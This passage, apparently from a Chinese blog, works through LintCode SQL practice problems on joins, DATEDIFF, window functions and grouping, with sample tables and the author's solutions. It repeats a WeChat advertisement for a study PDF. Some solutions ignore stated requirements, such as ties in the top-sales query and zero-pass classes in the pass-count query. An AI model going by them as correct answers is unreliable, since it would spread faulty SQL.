style="text-align:center">1</td><td style="text-align:center">Alice</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Bob</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Chalice</td><td style="text-align:center">95</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">David</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">Edward</td><td style="text-align:center">85</td></tr></tbody></table><p>表内容2：<code>course2_score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">name</th><th style="text-align:center">score</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Carl</td><td style="text-align:center">98</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Bill</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Ali</td><td style="text-align:center">95</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Ethan</td><td style="text-align:center">85</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">name</th><th style="text-align:center">score1</th><th style="text-align:center">score2</th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><p>题解：</p><p>因为他用加粗标出来了，需要按照name字段进行升序，所以要使用order by 。然后进行多表查询，通过筛选条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c1.name , c1.score c2.score from course1_score c1 , course2_score c2 </span><br><span class="line">where c1.name = c2.name </span><br><span class="line">order by c1.name;</span><br></pre></td></tr></table></figure><p>一开始我是这样，基本正确，但是不能通过🤯</p><p>因为一开始的话就要声明🤦‍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT c1.name, c1.score AS score1, c2.score AS score2 </span><br><span class="line">FROM course1_score c1, course2_score c2 </span><br><span class="line">WHERE c1.name = c2.name </span><br><span class="line">ORDER BY c1.name;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="11-lintcode-耗时前三的任务">11 lintcode <a href="https://lintcode.com/problem/3618/?showListFe=true&amp;page=1&amp;problemTypeId=3&amp;pageSize=50">耗时前三的任务</a></h2><p>描述</p><p>在本题中，你需要根据 <code>Tasks</code> 表：</p><table><thead><tr><th style="text-align:left">column</th><th style="text-align:left">type</th></tr></thead><tbody><tr><td style="text-align:left">id</td><td style="text-align:left">int</td></tr><tr><td style="text-align:left">start_date</td><td style="text-align:left">date</td></tr><tr><td style="text-align:left">end_date</td><td style="text-align:left">date</td></tr></tbody></table><p>找到任务耗时排名前三的任务（三条以下的记录只返回前 n 条）。你可以在样例中查看输出需要的格式。</p><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><ul><li><strong>如果存在多个消耗时间相同的任务，优先返回 <code>id</code> 较小的任务</strong></li></ul><p>样例</p><p><strong>样例 1</strong></p><p>输入：</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">start_date</th><th style="text-align:left">end_date</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">2019-01-06</td><td style="text-align:left">2019-04-16</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">2022-09-28</td><td style="text-align:left">2022-12-29</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">2020-07-25</td><td style="text-align:left">2020-09-29</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">2018-02-12</td><td style="text-align:left">2018-02-27</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">2022-08-20</td><td style="text-align:left">2022-11-18</td></tr></tbody></table><p>输出：</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">diff</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">100</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">92</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">90</td></tr></tbody></table><p><strong>样例 2</strong></p><p>输入：</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">start_date</th><th style="text-align:left">end_date</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">2019-01-06</td><td style="text-align:left">2019-04-16</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">2022-09-28</td><td style="text-align:left">2022-12-29</td></tr></tbody></table><p>输出：</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">diff</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">100</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">92</td></tr></tbody></table><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select id,datediff(end_date, start_date) as diff</span><br><span class="line">from Tasks</span><br><span class="line">order by diff desc</span><br><span class="line">limit 3;</span><br></pre></td></tr></table></figure><p>这个题目主要是用了排序的提交，还有分页，最重要的是日期函数datediff计算两个日期之间间隔的日子</p><p>一开始我没看到题目要求，忘了limit了提交不成功🤯</p><h2 id="12-lintcode-查询客户的推荐人">12 lintcode <a href="https://www.lintcode.com/problem/3614/?showListFe=true&amp;page=1&amp;problemTypeId=3&amp;level=1&amp;pageSize=50">查询客户的推荐人</a></h2><p>描述</p><p>给定表 <code>customer</code> ，里面存储了所有客户信息和他们的推荐人，具体如下所示。</p><table><thead><tr><th style="text-align:left">列名</th><th style="text-align:left">类型</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">id</td><td style="text-align:left">INT</td><td style="text-align:left">客户的 id，<strong>主键</strong></td></tr><tr><td style="text-align:left">name</td><td style="text-align:left">VARCHAR</td><td style="text-align:left">客户的名称</td></tr><tr><td style="text-align:left">referrer_id</td><td style="text-align:left">INT</td><td style="text-align:left">推荐人的 id</td></tr></tbody></table><p>现需要你写一个查询语句，返回一个<strong>只包含 <code>name</code> 字段的客户列表</strong>，要求列表中客户的推荐人编号都<strong>不是 1</strong>。</p><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><p><code>referrer_id</code> 可能会是 <em>null</em>，<strong>该情况也不是 1</strong>。</p><p>样例</p><p><strong>样例一</strong></p><p>输入数据</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">name</th><th style="text-align:left">referrer_id</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">Joanne Ferry</td><td style="text-align:left">null</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">Roberta Nader Sr.</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">Dr. Gwen Jacobson</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">Geraldine Kiehn III</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">Gwendolyn Howe IV</td><td style="text-align:left">2</td></tr></tbody></table><p>输出结果</p><table><thead><tr><th style="text-align:left">name</th></tr></thead><tbody><tr><td style="text-align:left">Joanne Ferry</td></tr><tr><td style="text-align:left">Roberta Nader Sr.</td></tr><tr><td style="text-align:left">Geraldine Kiehn III</td></tr><tr><td style="text-align:left">Gwendolyn Howe IV</td></tr></tbody></table><p><strong>样例二</strong></p><p>输入数据</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">name</th><th style="text-align:left">referrer_id</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">Joanne Ferry</td><td style="text-align:left">null</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">Roberta Nader Sr.</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">Dr. Gwen Jacobson</td><td style="text-align:left">2</td></tr></tbody></table><p>输出结果</p><table><thead><tr><th style="text-align:left">name</th></tr></thead><tbody><tr><td style="text-align:left">Joanne Ferry</td></tr><tr><td style="text-align:left">Dr. Gwen Jacobson</td></tr></tbody></table><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select name from customer</span><br><span class="line">where referrer_id is NULL or referrer_id &lt;&gt; 1;</span><br></pre></td></tr></table></figure><p>直接筛选就行，他这个题目好像出bug了，我的东西都是正确的但是他给我输出错误😊</p><ol start="13"><li><h2 id="lintcode-·-查询成绩排名在第二到第五的学生">lintcode <a href="https://www.lintcode.com/problem/3613/?showListFe=true&amp;page=1&amp;problemTypeId=3&amp;pageSize=50">· 查询成绩排名在第二到第五的学生</a></h2></li></ol><p>描述</p><p>请编写 SQL 语句，从成绩表 <code>score</code> 中查询所有学生的三门课程的总分排名，并返回排名 <code>score_rank</code> 在第二到第五的学生学号 <code>sno</code> 以及这名学生的总分 <code>total_score</code>，<strong>排名不设置并列排名，当总分相同时，学号 <code>sno</code> 小的学生排在前面。</strong></p><p>表定义：<code>score</code>（成绩表）</p><table><thead><tr><th style="text-align:center">列名</th><th style="text-align:center">类型</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int unsigned</td><td style="text-align:center">主键</td></tr><tr><td style="text-align:center">sno</td><td style="text-align:center">varchar</td><td style="text-align:center">学生学号</td></tr><tr><td style="text-align:center">course1</td><td style="text-align:center">int</td><td style="text-align:center">课程1的分数</td></tr><tr><td style="text-align:center">course2</td><td style="text-align:center">int</td><td style="text-align:center">课程2的分数</td></tr><tr><td style="text-align:center">course3</td><td style="text-align:center">int</td><td style="text-align:center">课程3的分数</td></tr></tbody></table><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><p>当学生数量不足 5 人时，返回包括第 2 名之后的剩余学生的成绩排名表格。</p><p>样例</p><p><strong>样例一：</strong><br>表内容：<code>score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">sno</th><th style="text-align:center">course1</th><th style="text-align:center">course2</th><th style="text-align:center">course3</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">001</td><td style="text-align:center">80</td><td style="text-align:center">90</td><td style="text-align:center">70</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">002</td><td style="text-align:center">90</td><td style="text-align:center">85</td><td style="text-align:center">80</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">003</td><td style="text-align:center">85</td><td style="text-align:center">70</td><td style="text-align:center">95</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">004</td><td style="text-align:center">80</td><td style="text-align:center">90</td><td style="text-align:center">85</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">005</td><td style="text-align:center">60</td><td style="text-align:center">80</td><td style="text-align:center">75</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">006</td><td style="text-align:center">90</td><td style="text-align:center">75</td><td style="text-align:center">70</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">score_rank</th><th style="text-align:center">sno</th><th style="text-align:center">total_score</th></tr></thead><tbody><tr><td style="text-align:center">2</td><td style="text-align:center">004</td><td style="text-align:center">255</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">003</td><td style="text-align:center">250</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">001</td><td style="text-align:center">240</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">006</td><td style="text-align:center">235</td></tr></tbody></table><p>学号为 <code>002</code> 和 <code>004</code> 的学生总分都为 <code>255</code>，但学号 <code>002</code> 较小，因此排在第一，而学号为 <code>004</code> 的学生排在第二。</p><p><strong>样例二：</strong><br>表内容：<code>score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">sno</th><th style="text-align:center">course1</th><th style="text-align:center">course2</th><th style="text-align:center">course3</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">001</td><td style="text-align:center">80</td><td style="text-align:center">90</td><td style="text-align:center">70</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">score_rank</th><th style="text-align:center">sno</th><th style="text-align:center">total_score</th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><p>没有排名从第二到第五的学生，返回空表。</p><p><strong>样例三：</strong><br>表内容：<code>score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">sno</th><th style="text-align:center">course1</th><th style="text-align:center">course2</th><th style="text-align:center">course3</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">001</td><td style="text-align:center">80</td><td style="text-align:center">90</td><td style="text-align:center">70</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">002</td><td style="text-align:center">85</td><td style="text-align:center">70</td><td style="text-align:center">95</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">003</td><td style="text-align:center">80</td><td style="text-align:center">90</td><td style="text-align:center">85</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">score_rank</th><th style="text-align:center">sno</th><th style="text-align:center">total_score</th></tr></thead><tbody><tr><td style="text-align:center">2</td><td style="text-align:center">002</td><td style="text-align:center">245</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">001</td><td style="text-align:center">240</td></tr></tbody></table><p>只有三名学生，返回第二到第三的学生。</p><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT row_number() over() as score_rank, sno, (course1 + course2 + course3) as total_score</span><br><span class="line">from score</span><br><span class="line">order by total_score desc</span><br><span class="line">limit 1,4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用<code>ROW_NUMBER()</code> 函数来计算排名，</p><p><strong>补充：在 SQL 中，<code>OVER</code> 子句与窗口函数一起使用，用于定义窗口或集合，窗口函数在该窗口或集合上执行计算。常见的窗口函数包括 <code>ROW_NUMBER()</code>, <code>RANK()</code>, <code>DENSE_RANK()</code>, 和 <code>SUM()</code> 等。</strong></p><ul><li><strong><code>**RANK()</code>：会为相同值的行分配相同的排名，并在不同值之间留出空缺。</strong></li><li><strong><code>DENSE_RANK()</code>：会为相同值的行分配相同的排名，但不会在不同值之间留出空缺。</strong></li></ul><p><strong>选择使用哪一个函数取决于你的需求：如果需要连续的排名（无空缺），使用 <code>DENSE_RANK()</code>；如果允许空缺，使用 <code>RANK()</code>。</strong></p><p>最后通过limit来限制出现2-5名即可</p><ol start="14"><li><h2 id="lintcode-所有学生都选修的课程">lintcode <a href="https://www.lintcode.com/problem/3610/?showListFe=true&amp;page=1&amp;problemTypeId=3&amp;pageSize=50">所有学生都选修的课程</a></h2></li></ol><p>描述</p><p>请编写 SQL 语句，从选课表 <code>courses</code> 中，查询选课表里存在的学生中，所有学生都选修的课程编号 <code>course_id</code>，并将结果 <code>course_id</code> 进行升序排序。</p><p>表定义：<code>courses</code>（选课表）</p><table><thead><tr><th style="text-align:center">列名</th><th style="text-align:center">类型</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int unsigned</td><td style="text-align:center">主键</td></tr><tr><td style="text-align:center">student_id</td><td style="text-align:center">int</td><td style="text-align:center">学生学号</td></tr><tr><td style="text-align:center">course_id</td><td style="text-align:center">varchar</td><td style="text-align:center">课程编号</td></tr></tbody></table><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><p>样例</p><p><strong>样例一：</strong></p><p>表内容：<code>courses</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">student_id</th><th style="text-align:center">course_id</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">101</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">1</td><td style="text-align:center">102</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">1</td><td style="text-align:center">103</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">2</td><td style="text-align:center">101</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">2</td><td style="text-align:center">103</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">4</td><td style="text-align:center">103</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">course_id</th></tr></thead><tbody><tr><td style="text-align:center">103</td></tr></tbody></table><p>解释：表中记录了学号为 1、2、4 的学生的选课情况，这三名学生都选修了课程编号为 <code>103</code> 的课程。</p><p><strong>样例二：</strong></p><p>表内容：<code>courses</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">student_id</th><th style="text-align:center">course_id</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">101</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">101</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">1</td><td style="text-align:center">102</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">2</td><td style="text-align:center">102</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">3</td><td style="text-align:center">103</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">course_id</th></tr></thead><tbody><tr><td style="text-align:center"></td></tr></tbody></table><p>解释：表中记录了学号为 1、2、3 的学生的选课情况，没有一门课程是这三名学生都选修的，故返回空表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select course_id</span><br><span class="line">from courses</span><br><span class="line">group by course_id</span><br><span class="line">having count(distinct student_id) = (select count(distinct student_id) from courses)</span><br></pre></td></tr></table></figure><p>having count(distinct student_id) = (select count(distinct student_id) from courses)这个选出学生id数量和课程数量相同的</p><p>然后进行分组，就可以选出其所有学生都选的课</p><ol start="15"><li><h2 id="lintcode-考试通过的人数">lintcode <a href="https://www.lintcode.com/problem/3607/description?showListFe=true&amp;page=1&amp;problemTypeId=3&amp;level=1&amp;pageSize=50"> 考试通过的人数</a></h2></li></ol><p>描述</p><p>请编写 SQL 语句，从学生表 <code>students</code> 和成绩表 <code>score</code> 中查询各个班级 <code>class</code> 中，<strong>三个课程都大于等于 60 分</strong>的学生数量 <code>pass_count</code>。</p><p>表定义1：<code>students</code>（学生表）</p><table><thead><tr><th style="text-align:center">列名</th><th style="text-align:center">类型</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int unsigned</td><td style="text-align:center">主键</td></tr><tr><td style="text-align:center">sno</td><td style="text-align:center">varchar</td><td style="text-align:center">学生学号</td></tr><tr><td style="text-align:center">name</td><td style="text-align:center">varchar</td><td style="text-align:center">学生姓名</td></tr><tr><td style="text-align:center">class</td><td style="text-align:center">varchar</td><td style="text-align:center">学生班级</td></tr></tbody></table><p>表定义2：<code>score</code>（成绩表）</p><table><thead><tr><th style="text-align:center">列名</th><th style="text-align:center">类型</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int unsigned</td><td style="text-align:center">主键</td></tr><tr><td style="text-align:center">sno</td><td style="text-align:center">varchar</td><td style="text-align:center">学生学号</td></tr><tr><td style="text-align:center">course1</td><td style="text-align:center">int</td><td style="text-align:center">课程1的分数</td></tr><tr><td style="text-align:center">course2</td><td style="text-align:center">int</td><td style="text-align:center">课程2的分数</td></tr><tr><td style="text-align:center">course3</td><td style="text-align:center">int</td><td style="text-align:center">课程3的分数</td></tr><tr><td style="text-align:center">total</td><td style="text-align:center">int</td><td style="text-align:center">总分</td></tr></tbody></table><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><p>需要返回 <code>students</code> 表中出现过的所有班级的 <code>pass_count</code>，若该班级没有符合条件的学生，则 <code>pass_count</code> 为 <strong>0 。</strong></p><p>样例</p><p><strong>样例一：</strong></p><p>表内容 1：<code>students</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">sno</th><th style="text-align:center">name</th><th style="text-align:center">class</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">001</td><td style="text-align:center">Martin Torphy</td><td style="text-align:center">CS01</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">002</td><td style="text-align:center">Eleanor Cummings</td><td style="text-align:center">CS01</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">003</td><td style="text-align:center">Franklin Upton</td><td style="text-align:center">CS02</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">004</td><td style="text-align:center">Toby Hudson</td><td style="text-align:center">CS02</td></tr></tbody></table><p>表内容 2：<code>score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">sno</th><th style="text-align:center">course1</th><th style="text-align:center">course2</th><th style="text-align:center">course3</th><th style="text-align:center">total</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">003</td><td style="text-align:center">100</td><td style="text-align:center">100</td><td style="text-align:center">100</td><td style="text-align:center">300</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">002</td><td style="text-align:center">90</td><td style="text-align:center">90</td><td style="text-align:center">100</td><td style="text-align:center">280</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">004</td><td style="text-align:center">80</td><td style="text-align:center">60</td><td style="text-align:center">70</td><td style="text-align:center">210</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">001</td><td style="text-align:center">59</td><td style="text-align:center">60</td><td style="text-align:center">60</td><td style="text-align:center">179</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">class</th><th style="text-align:center">pass_count</th></tr></thead><tbody><tr><td style="text-align:center">CS01</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">CS02</td><td style="text-align:center">2</td></tr></tbody></table><p><strong>样例二：</strong></p><p>表内容 1：<code>students</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">sno</th><th style="text-align:center">name</th><th style="text-align:center">class</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">001</td><td style="text-align:center">Martin Torphy</td><td style="text-align:center">CS02</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">002</td><td style="text-align:center">Eleanor Cummings</td><td style="text-align:center">CS02</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">003</td><td style="text-align:center">Franklin Upton</td><td style="text-align:center">CS02</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">004</td><td style="text-align:center">Toby Hudson</td><td style="text-align:center">CS02</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">005</td><td style="text-align:center">Marco Funk</td><td style="text-align:center">CS02</td></tr></tbody></table><p>表内容 2：<code>score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">sno</th><th style="text-align:center">course1</th><th style="text-align:center">course2</th><th style="text-align:center">course3</th><th style="text-align:center">total</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">005</td><td style="text-align:center">100</td><td style="text-align:center">100</td><td style="text-align:center">100</td><td style="text-align:center">300</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">002</td><td style="text-align:center">90</td><td style="text-align:center">90</td><td style="text-align:center">100</td><td style="text-align:center">280</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">004</td><td style="text-align:center">90</td><td style="text-align:center">90</td><td style="text-align:center">90</td><td style="text-align:center">270</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">003</td><td style="text-align:center">100</td><td style="text-align:center">100</td><td style="text-align:center">59</td><td style="text-align:center">259</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">001</td><td style="text-align:center">59</td><td style="text-align:center">59</td><td style="text-align:center">59</td><td style="text-align:center">177</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">class</th><th style="text-align:center">pass_count</th></tr></thead><tbody><tr><td style="text-align:center">CS02</td><td style="text-align:center">3</td></tr></tbody></table><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select s1.class as class ,count(s1.class) as pass_count</span><br><span class="line">from students  s1 join score  s2 on s1.sno = s2.sno</span><br><span class="line">where s2.course1 &gt;= 60 AND s2.course2 &gt;= 60 AND s2.course3 &gt;= 60</span><br><span class="line">group by s1.class;</span><br></pre></td></tr></table></figure><p>首先先要确定这是要进行多表查询，而且连接的条件是s1.sno = s2.sno这是两张表的连接条件</p><p>然后根据要求写where 语句都大于等于60分</p><p>然后根据班级分组</p><p>最后再写return返回的列表值</p><h2 id="16-lintcode-最棒的销售">16.lintcode 最棒的销售</h2><p>请你编写 SQL 语句，查询表 <code>sales</code> 表中销售额最高的销售 <code>id</code> 。<br>表定义：sales（销售表）</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">sales_sum</th><th style="text-align:left">satisfaction</th></tr></thead><tbody><tr><td style="text-align:left">id</td><td style="text-align:left">int</td><td style="text-align:left">主键</td></tr><tr><td style="text-align:left">sales_sum</td><td style="text-align:left">int</td><td style="text-align:left">销售额</td></tr><tr><td style="text-align:left">satisfaction</td><td style="text-align:left">float</td><td style="text-align:left">客户满意度</td></tr></tbody></table><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><p>如果存在多个 <code>id</code> 的销售额相同且都为最大值，则返回符合条件的所有 <code>id</code></p><p>样例</p><p>样例一</p><p>表内容：sales</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">sales_sum</th><th style="text-align:left">satisfaction</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">50000</td><td style="text-align:left">2.2</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">25000</td><td style="text-align:left">2.5</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">60000</td><td style="text-align:left">3.2</td></tr></tbody></table><p>在运行你的 <code>SQL</code> 语句后，表应返回：</p><table><thead><tr><th style="text-align:left">id</th></tr></thead><tbody><tr><td style="text-align:left">3</td></tr></tbody></table><p>样例二：<br>表内容：sales</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">sales_sum</th><th style="text-align:left">satisfaction</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">34560</td><td style="text-align:left">2.3</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">12345</td><td style="text-align:left">3.4</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">55000</td><td style="text-align:left">0.9</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">45000</td><td style="text-align:left">5</td></tr></tbody></table><p>在运行你的 <code>SQL</code> 语句后，表应返回：</p><table><thead><tr><th style="text-align:left">id</th></tr></thead><tbody><tr><td style="text-align:left">3</td></tr></tbody></table><p>题解：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> sales <span class="keyword">order</span> <span class="keyword">by</span> sales_sum <span class="keyword">desc</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="17-lintcode-视图处理算法-Merge">17.lintcode  视图处理算法 Merge</h2><p>请创建一个视图 <code>v_teachers</code> 查看 <code>teachers</code> 表中年龄大于25岁的教师信息，并使用 <code>Merge</code> 的视图算法</p><p>表定义 : teachers (教师表)</p><table><thead><tr><th style="text-align:center">列名</th><th style="text-align:center">类型</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int unsigned</td><td style="text-align:center">主键</td></tr><tr><td style="text-align:center">name</td><td style="text-align:center">varchar</td><td style="text-align:center">讲师姓名</td></tr><tr><td style="text-align:center">email</td><td style="text-align:center">varchar</td><td style="text-align:center">讲师邮箱</td></tr><tr><td style="text-align:center">age</td><td style="text-align:center">int</td><td style="text-align:center">讲师年龄</td></tr><tr><td style="text-align:center">country</td><td style="text-align:center">varchar</td><td style="text-align:center">讲师国籍</td></tr></tbody></table><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><p>样例</p><p><strong>输入数据：</strong></p><p><code>teachers</code> 表：</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">name</th><th style="text-align:left">email</th><th style="text-align:left">age</th><th style="text-align:left">country</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">‘Eastern heretic’</td><td style="text-align:left">‘<a href="mailto:eastern.heretic@gmail.com">eastern.heretic@gmail.com</a>’</td><td style="text-align:left">20</td><td style="text-align:left">‘UK’</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">‘Northern Beggar’</td><td style="text-align:left">‘<a href="mailto:northern.beggar@qq.com">northern.beggar@qq.com</a>’</td><td style="text-align:left">21</td><td style="text-align:left">‘CN’</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">‘Western Venom’</td><td style="text-align:left">‘<a href="mailto:western.venom@163.com">western.venom@163.com</a>’</td><td style="text-align:left">28</td><td 